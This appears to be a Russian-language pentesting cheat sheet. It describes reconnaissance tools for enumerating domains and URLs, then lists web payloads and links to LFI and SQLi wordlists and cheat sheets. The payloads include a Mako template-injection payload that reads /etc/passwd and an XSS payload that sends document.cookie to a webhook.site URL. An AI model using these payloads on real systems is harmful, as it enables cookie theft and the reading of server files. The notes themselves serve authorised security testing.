# Разведка доменных имен

https://github.com/glebarez/cero

Cero подключается к удалённым хостам и считывает доменные имена из сертификатов, предоставленных во время TLS-рукопожатия.
Сервер не ограничивается только HTTPS и может извлекать сертификаты из любого протокола, работающего через TLS (например, SMTPS) — просто укажите нужные порты для подключения.
Cero позволяет гибко указывать цели, включая доменные имена, IP-адреса и диапазоны CIDR, с полной поддержкой IPv6.

https://github.com/hakluke/hakip2host

hakip2host принимает список IP-адресов через stdin, а затем выполняет серию проверок для возврата связанных доменных имен.

- DNS PTR-поиски
- Альтернативные имена субъектов (SAN) в SSL-сертификатах
- Общие имена (CN) в SSL-сертификатах

https://github.com/projectdiscovery/httpx

httpx— это быстрый и многоцелевой HTTP-инструментарий, позволяющий запускать несколько тестов с помощью библиотеки retryablehttp . Он разработан для обеспечения надёжности результатов при увеличении числа потоков.

https://github.com/xnl-h4ck3r/waymore

Идея waymore заключается в том, чтобы найти еще больше ссылок с помощью Wayback Machine, чем с помощью других существующих инструментов.

👉 Самое большое отличие waymore от других инструментов заключается в том, что он также может загружать архивные ответы для URL-адресов на wayback machine, чтобы вы могли затем искать в них еще больше ссылок, комментариев разработчиков, дополнительных параметров и т. д. и т. п. 👉 Кроме того, другие инструменты в настоящее время не справляются с ограничением скорости, которое сейчас устанавливают источники, и часто просто останавливаются с неполными результатами и не сообщают вам об этом.

https://github.com/xnl-h4ck3r/xnLinkFinder

Это инструмент, используемый для обнаружения конечных точек (и потенциальных параметров) заданной цели. Он может найти их следующим образом:

сканирование цели (передача домена/URL)
сканирование нескольких целей (передача файла доменов/URL-адресов)
поиск файлов в заданном каталоге (передать имя каталога)
поиск по содержимому одного файла
получить их из проекта Burp (передать расположение XML-файла Burp)
получить их из проекта ZAP (передать местоположение файла сообщений ZAP ASCII)
получить их из проекта Caido (передать расположение файла CSV экспорта Caido)
обработка каталога результатов waymore (поиск архивных файлов ответов waymore -mode R, а также запрос URL-адресов waymore.txtи исходных URL-адресов waymore_index.txt- см. waymore README.md )
Скрипт на Python основан на возможностях поиска ссылок моего расширения Burp GAP . В качестве отправной точки я взял замечательный инструмент LinkFinder от Gerben Javado и использовал регулярное выражение для поиска ссылок, но с дополнительными улучшениями, позволяющими находить ещё больше ссылок.

# SSTI (Server-Side Template Injection) в Python

##  Mako Templates
### Проверка уязвимости
${7*7}  # → 49

### Чтение файла
<% import os %>${os.popen('cat /etc/passwd').read()}

# XSS Payload
[<]img src=x onerror="this.src='https://webhook.site/b8ce3f5c-707d-406f-a8df-0dd7928bca42?c='+document.cookie;"[>]

# LFI 
## Top 25 Local File Inclusion (LFI) Parameters
Лежат в файле https://github.com/felixsta/hack_tips/blob/main/Top_25_LFI_Parameters
##  LFI Wordlists
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI

https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
# SQLi
https://www.sqlinjection.net/stacked-queries/
https://pentestmonkey.net/category/cheat-sheet/sql-injection
# Burp Suite 
Turbo Intruder
Copy as FFUF Command
Hackvertor
Param Miner


